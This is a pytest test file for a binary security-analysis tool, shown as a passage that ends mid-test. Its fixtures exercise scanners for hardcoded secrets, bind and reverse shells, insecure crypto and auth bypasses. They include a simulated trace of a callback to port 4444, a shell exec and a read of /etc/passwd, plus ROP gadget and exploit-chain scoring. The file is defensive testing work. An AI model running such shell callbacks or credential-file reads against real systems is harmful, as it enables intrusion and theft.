"""Toolchain detection, RAG runtime config, and web command surface."""

import pytest

from binoracle.toolcheck import check_tools, render, ToolStatus
from binoracle.rag import get_kb, configure


def test_toolcheck_runs():
    st = check_tools()
    assert isinstance(st, list) and len(st) >= 12
    assert all(isinstance(x, ToolStatus) for x in st)
    # core oracles are always in the catalog (present or not)
    names = {x.name for x in st}
    assert any("radare2" in n for n in names)
    assert any("pwntools" in n for n in names)


def test_toolcheck_render():
    out = render(check_tools())
    assert "toolchain de pentest" in out
    assert "Estatico" in out or "static" in out.lower()


def test_rag_configure_toggles():
    kb = get_kb()
    # expand/rerank flip without needing a model (embed left untouched)
    configure(expand=True, rerank=True)
    assert kb._use_expand_llm is True and kb._use_rerank is True
    configure(expand=False, rerank=False)
    assert kb._use_expand_llm is False and kb._use_rerank is False


def test_rag_embed_requested_reflects_config_not_readiness():
    # Regresion: el panel web leia "embed": kb.embeds is not None para marcar la casilla
    # 'Semantico (embeddings)' -- eso es True SOLO cuando el hilo de fondo YA TERMINO de
    # construir los embeddings, asi que mientras embed_mode == 'construyendo...' (varios
    # segundos tras arrancar, con __init__ o tras un toggle) la casilla salia DESMARCADA,
    # pareciendo apagada cuando en realidad esta activa y terminando. _embed_requested separa
    # 'configurado/activo' de 'ya listo'.
    from unittest.mock import patch
    kb = get_kb()
    configure(embed=False)
    assert kb._embed_requested is False and kb.embeds is None
    # activar: _embed_requested pasa a True de inmediato aunque la construccion real (lenta,
    # sincrona en configure()) todavia no haya terminado -- se mockea _init_embeddings (no-op)
    # para no disparar el calculo real de embeddings sobre todo el KB en el test.
    with patch.object(kb, "_init_embeddings", lambda: None):
        configure(embed=True)
    assert kb._embed_requested is True
    configure(embed=False)          # deja el estado como estaba para no afectar otros tests


def test_rag_status_string():
    s = get_kb().status()
    assert "TF-IDF" in s and "chunks" in s


def test_secrets_scanner():
    # El scanner de credenciales detecta patrones reales y no dispara con placeholders.
    from binoracle.workflows.secrets import scan_secrets
    from binoracle.oracles.base import ToolResult

    class _Tool:
        def run(self):
            return ToolResult(True, "radare2: izz",
                              "AKIAIOSFODNN7EXAMPLE\npassword=SuperSecret123\n"
                              "password=changeme\napi_key=your_key_here")

    class _Reg:
        def get(self, name):
            return _Tool() if name == "r2_strings" else None

    fs = scan_secrets(_Reg(), "x")
    titles = " ".join(f.title.lower() for f in fs)
    assert any("aws" in t.lower() for t in [f.title for f in fs]), "no detecto la AWS key"
    assert any("credencial" in f.title.lower() for f in fs), "no detecto la password real"
    # placeholders (changeme / your_key_here) NO deben generar hallazgo
    joined = " ".join(f.evidence for f in fs)
    assert "changeme" not in joined and "your_key_here" not in joined


def test_secrets_extended_providers():
    # casuistica ampliada de credenciales (proveedores concretos + clave crypto)
    from binoracle.workflows.secrets import scan_secrets
    from binoracle.oracles.base import ToolResult

    class _T:
        def run(self):
            return ToolResult(True, "izz",
                              "sk_live_abcdefghij0123456789ABCD\n"
                              "glpat-xxxxYYYYzzzz11112222\n"
                              "\"type\": \"service_account\"\n"
                              "aes_key = 00112233445566778899aabbccddeeff\n"
                              "password=changeme\n")

    class _R:
        def get(self, n):
            return _T() if n == "r2_strings" else None

    titles = " ".join(f.title.lower() for f in scan_secrets(_R(), "x"))
    assert "stripe" in titles and "gitlab" in titles
    assert "service account" in titles or "gcp" in titles
    assert "criptografica" in titles
    # el placeholder changeme sigue filtrado
    assert "changeme" not in " ".join(f.evidence for f in scan_secrets(_R(), "x"))


def _mock_reg(imports="", strings="", same_func=True, callers=None):
    from binoracle.oracles.base import ToolResult

    class _T:
        def __init__(self, d): self.d = d
        def run(self): return ToolResult(True, "r2", self.d)

    # envuelve cada linea de `strings` como una fila real de la tabla `izz` (offset/seccion/tipo +
    # contenido), para que string_values() (que exige ese formato) las parsee igual que los
    # escaneres que aun miran el blob crudo (el contenido sigue presente, solo con prefijo).
    _wrapped_strings = "\n".join(
        f"0  0x0  0x0  {len(ln)}  {len(ln)}  .rdata  ascii  {ln}" for ln in strings.splitlines()
    ) if strings else strings

    class _Xrefs:
        # simula r2_xrefs (axt): con same_func=True (por defecto), toda funcion importada se dice
        # llamada desde 'main' -- suficiente para que shares_caller() vea coocurrencia en los tests
        # que no versan sobre esa logica. same_func=False simula funciones SIN llamador resuelto
        # (como haria un binario real donde los sinks estan en funciones distintas), para probar el
        # camino negativo de shares_caller. `callers` (opcional): {nombre: funcion} para asignar un
        # llamador DISTINTO por simbolo (simula p.ej. exec en una funcion y drop en otra).
        def run(self, target=""):
            name = target.rsplit(".", 1)[-1] if target else ""
            if callers is not None:
                fn = callers.get(name)
                return ToolResult(True, "r2", f"{fn} 0x1000 [CALL:--x] call sym.imp.{name}" if fn else "")
            if same_func and name and (name in imports.lower()):
                return ToolResult(True, "r2", f"main 0x1000 [CALL:--x] call sym.imp.{name}")
            return ToolResult(True, "r2", "")

    class _R:
        def get(self, name):
            if name == "r2_imports": return _T(imports)
            if name == "r2_strings": return _T(_wrapped_strings)
            if name == "r2_xrefs": return _Xrefs()
            return None
    return _R()


def test_fileperms_scanner():
    from binoracle.workflows.fileperms import scan_file_perms
    reg = _mock_reg(imports="sym.imp.tmpnam\nsym.imp.fopen\nsym.imp.chmod",
                    strings="/tmp/app_cache.dat")
    fs = scan_file_perms(reg, "x")
    titles = " ".join(f.title.lower() for f in fs)
    assert "tmpnam" in titles and "temporal" in titles  # temp inseguro + despliegue en /tmp


def test_commsec_scanner():
    from binoracle.workflows.commsec import scan_comms
    reg = _mock_reg(imports="sym.imp.MD5_Init",
                    strings="http://updates.local/x\nCURLOPT_SSL_VERIFYPEER=0\nRC4")
    fs = scan_comms(reg, "x")
    titles = " ".join(f.title.lower() for f in fs)
    assert "sin cifrar" in titles         # cleartext http
    assert "certificado" in titles        # verify disabled
    assert "criptografia" in titles       # weak crypto
    # casuistica ampliada DA4/DA7: Blowfish, MD2, protocolo obsoleto, ws:// en claro
    reg2 = _mock_reg(imports="sym.imp.BF_set_key",
                     strings="ws://live/feed\nSSLv3_method\nMD2_Init")
    t2 = " ".join(f.title.lower() for f in scan_comms(reg2, "x"))
    assert "obsoleto" in t2               # SSLv3
    assert "sin cifrar" in t2             # ws://
    assert "criptografia" in t2           # blowfish / md2


def test_backdoors_scanner():
    from binoracle.workflows.backdoors import scan_backdoors
    # bind shell: socket + bind + listen + dup2/execve + /bin/sh
    reg = _mock_reg(imports="sym.imp.socket\nsym.imp.bind\nsym.imp.listen\nsym.imp.dup2\nsym.imp.execve",
                    strings="/bin/sh")
    fs = scan_backdoors(reg, "x")
    titles = " ".join(f.title.lower() for f in fs)
    assert "bind shell" in titles, "no detecto la bind shell"
    # reverse shell: socket + connect + execve
    reg2 = _mock_reg(imports="sym.imp.socket\nsym.imp.connect\nsym.imp.execl", strings="")
    ts2 = " ".join(f.title.lower() for f in scan_backdoors(reg2, "x"))
    assert "reverse shell" in ts2, "no detecto la reverse shell"
    # inyeccion por concatenacion: system + sprintf
    reg3 = _mock_reg(imports="sym.imp.system\nsym.imp.sprintf", strings="")
    ts3 = " ".join(f.title.lower() for f in scan_backdoors(reg3, "x"))
    assert "concatenacion" in ts3, "no detecto la inyeccion por concatenacion"
    # sin red y sin builders: sin falsos positivos
    assert scan_backdoors(_mock_reg(imports="sym.imp.printf", strings=""), "x") == []


def test_backdoors_cites_the_real_function_not_a_generic_location():
    # Pedido explicito del usuario ("hay que ir mas alla en todos los casos", aplicado mas alla de
    # credenciales): la location no debe quedarse en el generico fijo "binario / red" -- debe citar
    # la funcion REAL confirmada por xref (shared_caller_fns), igual que se hizo para credenciales.
    from binoracle.workflows.backdoors import scan_backdoors
    from unittest.mock import MagicMock

    def make_reg(caller_fn):
        reg = MagicMock()
        imports_tool = _mock_tool(data="1 0x1 GLOBAL FUNC socket\n2 0x2 GLOBAL FUNC bind\n"
                                       "3 0x3 GLOBAL FUNC listen\n4 0x4 GLOBAL FUNC execve\n")
        strings_tool = _mock_tool(data="")

        class _Xrefs:
            def run(self, target=""):
                name = target.rsplit(".", 1)[-1] if target else ""
                if name in ("socket", "bind", "listen", "execve"):
                    return MagicMock(ok=True, data=f"{caller_fn} 0x1000 [CALL:--x] call sym.imp.{name}")
                return MagicMock(ok=True, data="")

        reg.get.side_effect = lambda n: {"r2_imports": imports_tool, "r2_strings": strings_tool,
                                         "r2_xrefs": _Xrefs()}.get(n)
        return reg

    fs = scan_backdoors(make_reg("fcn.deploy_listener"), "x")
    bind = next(f for f in fs if "bind shell" in f.title.lower())
    assert bind.location == "fcn.deploy_listener"
    assert "fcn.deploy_listener" in bind.rationale


def test_callers_of_falls_back_to_deep_analysis_when_light_analysis_finds_nothing():
    # Mismo arreglo (analisis ligero 'aa' del ToolRegistry puede no encontrar un xref real) aplicado
    # de forma general a callers_of/shared_caller_fns -- usado por backdoors.py, authz.py,
    # fileperms.py e injection.py, asi que este UNICO arreglo los beneficia a todos.
    from unittest.mock import MagicMock, patch
    from binoracle.workflows._binfacts import callers_of, shared_caller_fns

    reg = MagicMock()
    reg.get.side_effect = lambda n: {"r2_xrefs": _mock_tool(data="")}.get(n)  # ligero: nada

    with patch("binoracle.oracles.r2session.cmd_timeout",
               return_value="fcn.real_caller 0x1000 [CALL:--x] call sym.imp.system") as deep:
        fns = callers_of(reg, "system", "/real/path/target.bin")
    assert fns == {"fcn.real_caller"}
    deep.assert_called()

    # sin `binary`: sin reintento, se comporta como antes (compatibilidad hacia atras)
    with patch("binoracle.oracles.r2session.cmd_timeout") as deep2:
        assert callers_of(reg, "system") == set()
    deep2.assert_not_called()

    # shared_caller_fns: misma logica, para dos sinks distintos que resultan en la MISMA funcion
    def deep_side_effect(binary, cmd, timeout=60):
        if "getenv" in cmd:
            return "fcn.real_caller 0x1000 [CALL:--x] call sym.imp.getenv"
        if "system" in cmd:
            return "fcn.real_caller 0x1010 [CALL:--x] call sym.imp.system"
        return ""
    with patch("binoracle.oracles.r2session.cmd_timeout", side_effect=deep_side_effect):
        assert shared_caller_fns(reg, ["getenv"], ["system"], "/real/path/target.bin") == {"fcn.real_caller"}


def test_dynamic_parse_and_findings():
    # Parser del shim LD_PRELOAD + generacion de hallazgos (sin docker: se prueba _parse directo).
    from binoracle.workflows.dynamictrace import _parse, dynamic_findings
    # formato del shim: el valor con espacios (cmd/path) va SIEMPRE al final de linea
    log = (
        "__BO__ connect ip=10.13.37.7 port=4444\n"
        "__BO__ bind ip=0.0.0.0 port=1337\n"
        "__BO__ open path=/etc/passwd\n"
        "__BO__ chmod mode=777 path=/tmp/x\n"
        "__BO__ execve arg=sh path=/bin/sh\n"
        "__BO__ system cmd=cat /etc/passwd /tmp/notes.txt\n"
        "algo de ruido que no es evento\n"
    )
    t = _parse(log)
    assert t.connects and t.connects[0]["ip"] == "10.13.37.7" and t.connects[0]["port"] == "4444"
    assert t.binds and t.binds[0]["port"] == "1337"
    assert "/etc/passwd" in t.files
    assert t.chmods and t.chmods[0]["mode"] == "777" and t.chmods[0]["path"] == "/tmp/x"
    assert any("/bin/sh" in e for e in t.execs)
    # comando con espacios NO se trunca (regresion del bug de _kv)
    assert any("cat /etc/passwd /tmp/notes.txt" in e for e in t.execs)
    titles = " ".join(f.title.lower() for f in dynamic_findings(t, "es"))
    assert "conexion saliente" in titles     # callback
    assert "shell" in titles                  # exec de shell
    assert "sensibles" in titles              # /etc/passwd
    assert all(f.verdict == "verified" for f in dynamic_findings(t, "es"))  # ejecucion real


def test_attack_chain_runtime():
    # La cadena de explotacion incluye el callback en runtime cuando hay conexion saliente.
    from binoracle.report.html import _attack_chain
    from binoracle.store.session import Finding
    fs = [Finding(title="Conexion saliente en runtime a 10.13.37.7:4444", severity="high",
                  verdict="verified", location="runtime / red", evidence="[dynamic] connect")]
    h = _attack_chain(fs, {"Canary": None, "PIE": None}, "es")
    assert "C2" in h or "exfiltracion" in h
    assert "chain-step" in h


def test_attack_chain_credentials_cites_the_real_xref_not_generic_text():
    # Bug real senalado por el usuario mirando el informe de Ingrid.exe: el paso "Secreto
    # hardcodeado -> Auth bypass / acceso" de la cadena de credenciales imprimia SIEMPRE las
    # mismas dos frases genericas, sin importar que secrets.py/authcheck.py YA sepan (via xref)
    # en que funcion se usa la credencial y si la comparacion esta confirmada. La cadena debe
    # citar esos datos reales, no repetir texto fijo.
    from binoracle.report.html import _attack_chain
    from binoracle.store.session import Finding

    secret = Finding(title="Posible contrasena hardcodeada", severity="high", verdict="grounded",
                     location="usado en: check_login", evidence="ev")
    cmp_confirmed = Finding(
        title="Autenticacion por comparacion con credencial hardcodeada (confirmado por xref)",
        severity="high", verdict="grounded", location="auth / comparacion",
        evidence="[radare2: ii + izz]\ncomparacion: strcmp\ncandidatas: \"S3cr3t!\"\n"
                 "xref confirmado: check_login (strcmp)")
    h = _attack_chain([secret, cmp_confirmed], {}, "es")
    assert "check_login" in h                      # la funcion real, no un texto generico
    assert "CONFIRMADO por xref" in h
    assert "strcmp" in h
    # sin xref (solo correlacion): la cadena debe decirlo honestamente, no inventar confirmacion
    cmp_unconfirmed = Finding(
        title="Autenticacion por comparacion con credencial hardcodeada",
        severity="high", verdict="grounded", location="auth / comparacion",
        evidence="[radare2: ii + izz]\ncomparacion: strcmp\ncandidatas: \"S3cr3t!\"")
    h2 = _attack_chain([secret, cmp_unconfirmed], {}, "es")
    assert "NO confirmado por xref" in h2
    # con bypass verificado en sandbox: se anade un tercer eslabon VERIFICADO
    verified = Finding(title="Bypass de autenticacion VERIFICADO (credencial hardcodeada funciona)",
                       severity="critical", verdict="verified", location="check_login (strcmp)",
                       evidence="ev", rationale="codigo de salida DIFIRIO: evidencia real")
    h3 = _attack_chain([secret, cmp_confirmed, verified], {}, "es")
    assert "VERIFICADO" in h3 and "#30a46c" in h3   # color de paso verificado


def test_attack_chain_covers_hidden_auth_logic_from_llm_review_not_just_credentials():
    # Pedido explicito del usuario: no basta con mirar la credencial hardcodeada clasica, hay que
    # mirar TODOS los mecanismos/comprobaciones de autenticacion (backdoor, flag de depuracion,
    # licencia/serial...) que la revision LLM sin restricciones encuentre, y encadenarlos igual de
    # grounded (citando el hallazgo real), distinguiendo hipotesis sin confirmar de bypass
    # VERIFICADO en sandbox.
    from binoracle.report.html import _attack_chain
    from binoracle.store.session import Finding

    hyp = Finding(title="[Revision LLM] Flag de depuracion salta la comprobacion de licencia",
                 severity="high", verdict="unverified", location="revision LLM", evidence="ev",
                 rationale="Si arg1 == 'DEVMODE99' se salta check_license() por completo.")
    hyp.credential_candidate = "DEVMODE99"
    h = _attack_chain([hyp], {}, "es")
    assert "Logica de autenticacion oculta" in h
    assert "DEVMODE99" in h
    assert "Sin confirmar (hipotesis)" in h
    assert "#f5b800" in h                            # amarillo: hipotesis sin confirmar

    # confirmada de verdad en sandbox (authbypass.py subio verdict a "verified")
    hyp_confirmed = Finding(
        title="[Revision LLM] Flag de depuracion salta la comprobacion de licencia",
        severity="critical", verdict="verified", location="revision LLM", evidence="ev",
        rationale="Si arg1 == 'DEVMODE99' se salta check_license(). CONFIRMADO en sandbox: el "
                 "codigo de salida DIFIRIO al probar esta entrada de verdad contra el binario real.")
    hyp_confirmed.credential_candidate = "DEVMODE99"
    h2 = _attack_chain([hyp_confirmed], {}, "es")
    assert "Bypass VERIFICADO en sandbox" in h2
    assert "#30a46c" in h2                           # verde: confirmado por ejecucion real

    # una revision LLM sin candidato concreto (ninguna entrada citable) no genera esta cadena:
    # no hay nada verificable que encadenar, solo ruido
    no_cand = Finding(title="[Revision LLM] Posible logica de negocio sospechosa",
                      severity="low", verdict="unverified", location="revision LLM", evidence="ev",
                      rationale="Sin entrada concreta citable en el contexto.")
    assert "Logica de autenticacion oculta" not in _attack_chain([no_cand], {}, "es")


def test_chainanalyzer_classify_and_score():
    from binoracle.workflows.chainanalyzer import (_classify, _best_for, _score, ExploitChain, Gadget)
    # gadget limpio: pop rdi; ret
    g = _classify({"retaddr": 0x401234, "opcodes": [
        {"addr": 0x401234, "opcode": "pop rdi", "type": "pop"},
        {"addr": 0x401235, "opcode": "ret", "type": "ret"}]})
    assert g and g.sets == ["rdi"] and g.stack_delta == 16 and g.kind == "pop"
    # gadget sucio: contiene un salto condicional -> no utilizable
    assert _classify({"retaddr": 0x1, "opcodes": [
        {"opcode": "jrcxz 0x1", "type": "cjmp"}, {"opcode": "pop rdi", "type": "pop"},
        {"opcode": "ret", "type": "ret"}]}) is None
    # syscall
    gs = _classify({"retaddr": 0x2, "opcodes": [{"opcode": "syscall", "type": "syscall"}]})
    assert gs and gs.kind == "syscall"
    # _best_for elige el pop del registro pedido
    assert _best_for([g, gs], "rdi") is g and _best_for([gs], "rdi") is None
    # scoring: cadena con requisito faltante no es factible y puntua menos
    c = ExploitChain(name="t", requirements=["[OK] a", "[X] b"], gadgets_used=[1])
    _score(c)
    assert c.feasible is False and c.score < 100
    c2 = ExploitChain(name="ok", requirements=["[OK] a"], gadgets_used=[])
    _score(c2)
    assert c2.feasible is True and c2.score == 100


def test_dotnet_detect_and_secrets(tmp_path):
    from binoracle.workflows.dotnet import is_dotnet, _scan_code_secrets, decompile_dotnet
    # deteccion por firma: MZ + 'BSJB' -> .NET; MZ sin BSJB -> no
    net = tmp_path / "a.exe"; net.write_bytes(b"MZ" + b"\x00" * 200 + b"BSJB" + b"\x00" * 50)
    native = tmp_path / "b"; native.write_bytes(b"\x7fELF" + b"\x00" * 100)
    plainpe = tmp_path / "c.exe"; plainpe.write_bytes(b"MZ" + b"\x00" * 300)
    assert is_dotnet(str(net)) is True
    assert is_dotnet(str(native)) is False
    assert is_dotnet(str(plainpe)) is False
    # decompile degrada bien si no es .NET
    assert decompile_dotnet(str(native)).is_dotnet is False
    # escaneo de secretos en codigo decompilado
    code = ('class X { const string Password = "hunter2_backdoor";\n'
            ' const string Greeting = "hello world";\n'
            ' string conn = "Server=db;User Id=sa;Password=Str0ng!";\n'
            ' const string ApiKey = "changeme"; }')
    hits = {h["value"] for h in _scan_code_secrets(code)}
    assert "hunter2_backdoor" in hits           # const con nombre sospechoso
    assert any("User Id=sa" in v for v in hits)  # cadena de conexion
    assert "hello world" not in hits             # const generica: ignorada
    assert "changeme" not in hits                # placeholder: ignorado


def test_cvss_mapping():
    from binoracle.report.cvss import cvss_for, classify
    from binoracle.store.session import Finding
    def F(t, v): return Finding(title=t, severity="high", verdict=v, location="", evidence="")
    # clasificacion por clase
    assert classify(F("Exploit ret2win verificado", "verified")) == "mem_rce"
    assert classify(F("Posible reverse shell", "grounded")) == "net_rce"
    assert classify(F("Secreto hardcodeado: apikey", "grounded")) == "secret"
    assert classify(F("Algo que no encaja en nada", "grounded")) is None
    # verificado -> E:A ; grounded -> E:P ; el vector siempre presente
    rv = cvss_for(F("Exploit ret2win verificado", "verified"))
    rg = cvss_for(F("Desbordamiento de buffer overflow", "grounded"))
    assert rv.exploit_maturity == "A" and "/E:A" in rv.vector
    assert rg.exploit_maturity == "P" and "/E:P" in rg.vector
    assert cvss_for(F("nada", "grounded")) is None    # no se inventa CVSS
    # si la libreria cvss esta instalada, el score es el oficial (verificado >= grounded misma clase)
    try:
        import cvss  # noqa: F401
        assert rv.base is not None and rg.base is not None and rv.base >= rg.base
        assert rv.severity in ("Critical", "High", "Medium", "Low", "None")
    except ImportError:
        assert rv.base is None   # degrada sin romper


def test_ghidra_client_extract_and_fallback():
    from binoracle.oracles import ghidra as g
    # extraccion de codigo desde respuesta JSON envuelta (formato del plugin GhidraMCP)
    j = ('{"success":true,"name":"main","address":"0x401136",'
         '"decompilation":"undefined8 main(void){ char buf[64]; read(0, buf, 256); return 0; }"}')
    code = g._extract_code(j)
    assert code and "read(0, buf, 256)" in code
    # ruido no-C -> None (no se inventa decompilacion)
    assert g._extract_code("ok connected") is None
    assert g._extract_code("") is None
    # sin servidor arriba: indisponible y None, sin excepcion (fallback a r2)
    import os
    os.environ["BINORACLE_GHIDRA_URL"] = "http://127.0.0.1:1"   # puerto imposible
    assert g.available(timeout=1.0) is False
    assert g.decompile_function("main", timeout=1.0) is None
    os.environ.pop("BINORACLE_GHIDRA_URL", None)


def test_ghidra_server_config_logic(monkeypatch):
    from binoracle.oracles import ghidra_server as gs
    # autostart: env manda sobre config
    monkeypatch.setenv("BINORACLE_GHIDRA_AUTOSTART", "0")
    assert gs.autostart_enabled({"autostart": True}) is False
    monkeypatch.setenv("BINORACLE_GHIDRA_AUTOSTART", "1")
    assert gs.autostart_enabled({"autostart": False}) is True
    monkeypatch.delenv("BINORACLE_GHIDRA_AUTOSTART", raising=False)
    assert gs.autostart_enabled({"autostart": True}) is True
    assert gs.autostart_enabled({}) is True          # default ON
    # port: env > cfg > default
    monkeypatch.setenv("BINORACLE_GHIDRA_PORT", "9999")
    assert gs._port({"port": 8089}) == 9999
    monkeypatch.delenv("BINORACLE_GHIDRA_PORT", raising=False)
    assert gs._port({"port": 8100}) == 8100
    assert gs._port({}) == 8089
    # stop(None) no rompe
    gs.stop(None)


def test_decai_parse_and_enable(monkeypatch):
    from binoracle.oracles import decai as dc
    # _clean: extrae el bloque de codigo de la salida con fences markdown
    out = "bla bla\n```c\nint f(int a){ return a+1; }\n```\nmas texto"
    code = dc._clean(out)
    assert code and "return a+1" in code and "bla bla" not in code
    # sin codigo -> None (no se inventa)
    assert dc._clean("solo texto sin codigo") is None
    assert dc._clean("") is None
    # enabled: env manda (si esta instalado)
    monkeypatch.setattr(dc, "installed", lambda: True)
    monkeypatch.setenv("BINORACLE_DECAI", "0")
    assert dc.enabled() is False
    monkeypatch.setenv("BINORACLE_DECAI", "1")
    assert dc.enabled() is True
    # si no esta instalado, siempre False
    monkeypatch.setattr(dc, "installed", lambda: False)
    assert dc.enabled() is False


def test_decompile_crosscheck():
    from binoracle.workflows.decompile import _crosscheck
    v = [("ghidra", "void vuln(){ char buf[64]; read(0,buf,256); }"),
         ("decai", "int vuln(int fd,char*buf){ return read(fd,buf,256); }"),
         ("pdg", "void vuln(){ char b[64]; gets(b); }")]
    note = _crosscheck(v, "es")
    assert "gets" in note and "read" in note        # discrepancia de sinks detectada
    assert "tamano" in note.lower() or "confirm" in note.lower()
    assert _crosscheck(v[:1], "es") == ""            # <2 motores -> sin contraste
    # coincidencia total de sinks
    agree = [("ghidra", "read(0,b,256);"), ("decai", "read(fd,b,256);")]
    assert "coinciden" in _crosscheck(agree, "es").lower()


def test_r2session_cmd_timeout_never_hangs_the_pipeline():
    # Bug real encontrado probando el informe de Ingrid.exe en el navegador: r2pipe.cmd() no tiene
    # NINGUN timeout nativo. Un `pdg @ func` (decompilador r2ghidra) colgado -- por una funcion
    # rara, o por un servidor Ghidra externo emparejado con otro binario dejando la sesion r2 en
    # mal estado -- se llevaba por delante el informe ENTERO sin ningun error visible (40+ minutos
    # de espera real). cmd_timeout() debe devolver None dentro del limite de tiempo en vez de
    # bloquear para siempre, e invalidar la sesion colgada para que la siguiente llamada a get()
    # abra una limpia.
    import os
    import time
    import tempfile
    from binoracle.oracles import r2session

    d = tempfile.mkdtemp()
    b = os.path.join(d, "target.bin")
    with open(b, "wb") as fh:
        fh.write(b"\x7fELF" + os.urandom(200))

    class _FakeProc:
        def __init__(self):
            self.killed = False
        def kill(self):
            self.killed = True

    class _HangingR2:
        """Simula r.cmd() colgado para siempre (como pdg en r2 real sin timeout)."""
        def __init__(self):
            self.process = _FakeProc()
        def cmd(self, c):
            time.sleep(5)  # mucho mas que el timeout de prueba (0.2s)
            return "nunca deberia llegar aqui"

    fake = _HangingR2()
    r2session._CACHE[os.path.abspath(b)] = (fake, os.path.getmtime(b))
    t0 = time.time()
    out = r2session.cmd_timeout(b, "pdg @ main", timeout=0.2)
    elapsed = time.time() - t0
    assert out is None
    assert elapsed < 2.0, "cmd_timeout no debe esperar mucho mas que el timeout pedido"
    assert fake.process.killed, "la sesion colgada debe matarse para no dejarla zombie"
    assert os.path.abspath(b) not in r2session._CACHE, "la sesion colgada se invalida del cache"

    # camino feliz: un comando que responde a tiempo devuelve su resultado normalmente
    class _FastR2:
        def __init__(self):
            self.process = _FakeProc()
        def cmd(self, c):
            return "void main(){}"
    fast = _FastR2()
    r2session._CACHE[os.path.abspath(b)] = (fast, os.path.getmtime(b))
    assert r2session.cmd_timeout(b, "pdg @ main", timeout=2.0) == "void main(){}"
    assert not fast.process.killed


def test_r2session_get_aaa_never_hangs_the_pipeline(monkeypatch):
    # Mismo patron de bug que test_r2session_cmd_timeout_never_hangs_the_pipeline, pero en el
    # propio `aaa` que get() corre al abrir CUALQUIER binario por primera vez (no solo en `pdg`):
    # bug real encontrado en vivo probando un PIE real (ret2win_pie) bajo CPU muy limitada --
    # `aaa` sin timeout dejo el test entero (y por extension cualquier workflow que abra r2 por
    # primera vez: triage, vulnhunt, chainanalyzer, reachability...) bloqueado mucho mas de lo
    # razonable. get() debe devolver None dentro del limite de tiempo en vez de colgarse.
    import os
    import time
    import tempfile
    from binoracle.oracles import r2session

    d = tempfile.mkdtemp()
    b = os.path.join(d, "target.bin")
    with open(b, "wb") as fh:
        fh.write(b"\x7fELF" + os.urandom(200))

    class _FakeProc:
        def __init__(self):
            self.killed = False
        def kill(self):
            self.killed = True

    class _HangingR2:
        def __init__(self):
            self.process = _FakeProc()
        def cmd(self, c):
            if c == "aaa":
                time.sleep(5)   # mucho mas que el timeout de prueba (0.2s)
            return ""

    fake = _HangingR2()
    monkeypatch.setattr("r2pipe.open", lambda *a, **kw: fake)
    r2session._CACHE.pop(os.path.abspath(b), None)

    t0 = time.time()
    r = r2session.get(b, aaa_timeout=0.2)
    elapsed = time.time() - t0

    assert r is None
    assert elapsed < 2.0, "get() no debe esperar mucho mas que aaa_timeout"
    assert fake.process.killed, "la sesion colgada debe matarse para no dejarla zombie"
    assert os.path.abspath(b) not in r2session._CACHE, "una sesion con aaa colgado no se cachea"

    # camino feliz: aaa que responde a tiempo se cachea normalmente
    class _FastR2:
        def __init__(self):
            self.process = _FakeProc()
        def cmd(self, c):
            return ""
    fast = _FastR2()
    monkeypatch.setattr("r2pipe.open", lambda *a, **kw: fast)
    r2session._CACHE.pop(os.path.abspath(b), None)
    r2 = r2session.get(b, aaa_timeout=2.0)
    assert r2 is fast
    assert os.path.abspath(b) in r2session._CACHE
    assert not fast.process.killed


def test_sarif_export():
    import json
    from binoracle.report.render import findings_to_sarif
    from binoracle.store.session import Finding
    fs = [
        Finding(title="Exploit ret2win verificado", severity="critical", verdict="verified",
                location="win=0x401156", evidence="offset=72", rationale="ret2win alcanzado",
                recommendation="canary+PIE"),
        Finding(title="Comunicacion sin cifrar (cleartext)", severity="medium", verdict="grounded",
                location=".text", evidence="http://x", rationale="trafico en claro", recommendation="TLS"),
    ]
    doc = json.loads(findings_to_sarif("/tmp/vuln", fs))
    assert doc["version"] == "2.1.0"
    run = doc["runs"][0]
    assert run["tool"]["driver"]["name"] == "binoracle"
    assert len(run["results"]) == 2
    r0 = run["results"][0]
    assert r0["level"] == "error"                 # critical -> error
    assert run["results"][1]["level"] == "warning"  # medium -> warning
    assert r0["properties"]["verdict"] == "verified"
    # si cvss esta, el vector 4.0 y security-severity aparecen
    try:
        import cvss  # noqa: F401
        assert r0["properties"]["cvss_v4_vector"].startswith("CVSS:4.0/")
        assert "security-severity" in r0["properties"]
    except ImportError:
        pass
    # cada result referencia una rule declarada
    rule_ids = {rule["id"] for rule in run["tool"]["driver"]["rules"]}
    assert all(res["ruleId"] in rule_ids for res in run["results"])


def test_chain_verify_proof_plumbing():
    from binoracle.workflows.chainanalyzer import _proof_from_pie, ExploitChain
    # parseo de la linea de autopie
    p = _proof_from_pie("VERIFIED off=72 base=0x555555554000 strategy=rop-pie")
    assert p["offset"] == 72 and p["base"] == "0x555555554000" and p["strategy"] == "rop-pie"
    assert _proof_from_pie("NOT_VERIFIED") == {}
    # el dataclass lleva los campos de prueba, por defecto sin verificar
    c = ExploitChain(name="x")
    assert c.verified is False and c.proof == {}


def test_chain_badchars():
    from binoracle.workflows.chainanalyzer import (_sig_bytes, _bad_in, _apply_badchars,
                                                   _SINK_BADCHARS, ExploitChain)
    # bytes significativos (sin ceros altos) y deteccion del byte prohibido
    assert _sig_bytes(0x40010a) == [0x0a, 0x01, 0x40]
    assert _bad_in(0x40010a, _SINK_BADCHARS["gets"]) == [0x0a]     # newline en la direccion
    assert _bad_in(0x401156, _SINK_BADCHARS["gets"]) == []          # limpia
    assert _bad_in(0x401156, _SINK_BADCHARS["read"]) == []          # read es binario-safe
    # scanf corta en espacio (0x20): 0x402041 lo contiene
    assert 0x20 in _bad_in(0x402041, _SINK_BADCHARS["scanf"])
    # _apply_badchars anade un break-point por cada direccion con byte prohibido
    c = ExploitChain(name="t")
    _apply_badchars(c, [0x40010a, 0x401156], _SINK_BADCHARS["gets"], "gets", "es")
    assert len(c.break_points) == 1 and "0xa" in c.break_points[0]
    # sin badset (read) no marca nada
    c2 = ExploitChain(name="t2")
    _apply_badchars(c2, [0x40010a], set(), "read", "es")
    assert c2.break_points == []


def test_rag_health():
    # El conocimiento debe estar LIMPIO: sin duplicados exactos ni chino sin traducir (>2% CJK),
    # para no alimentar 'cosas falsas'. El RAG es referencia; los hallazgos salen de oraculos.
    from binoracle.rag import get_kb
    h = get_kb().health()
    assert h["chunks"] > 0 and h["docs"] > 0 and h["sources"] > 0
    assert h["duplicates"] == 0, f"hay {h['duplicates']} chunks duplicados en el RAG"
    assert h["cjk_chunks"] == 0, f"chino sin traducir en: {h['cjk_docs']}"
    assert h["clean"] is True


def test_owasp_scanners_da2_da9_da10():
    # Las 3 categorias que faltaban ahora tienen scanner real (DA2 auth, DA9 versiones, DA10 logging)
    from binoracle.workflows.versions import scan_versions
    from binoracle.workflows.authcheck import scan_auth
    from binoracle.workflows.logging_check import scan_logging
